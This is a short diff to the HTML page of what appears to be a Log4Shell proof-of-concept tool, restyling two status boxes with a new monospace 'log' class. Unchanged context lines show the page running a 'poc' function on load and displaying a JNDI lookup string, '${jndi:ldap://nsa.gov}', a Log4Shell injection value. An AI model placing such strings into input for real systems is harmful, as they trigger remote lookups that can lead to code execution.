@@ -69,7 +69,15 @@
             font-size: 15px;
             color: #2F3335;
         }
-
+        .log {
+            display: block;
+            unicode-bidi: embed;
+            font-family: monospace;
+            white-space: pre;
+            font-size: 18px;
+            width: 100%;
+            height: 80%;
+        }
     </style>
     <script>
         function allset() {
@@ -91,13 +99,13 @@
 <body onload="setTimeout(poc, 1500);">
 
     <div id="loader" class="loader"></div>
-    <div id="awaiting" class="info" style="display:none;">
+    <div id="awaiting" class="log" style="display:none;">
         Awaiting Payload...
         <br />
         <span class="j">${jndi:ldap://nsa.gov}</span>
     </div>
 
-    <div id="allset" class="info" style="display:none;">
+    <div id="allset" class="log" style="display:none;">
         Awaiting Payload...
     </div>
 
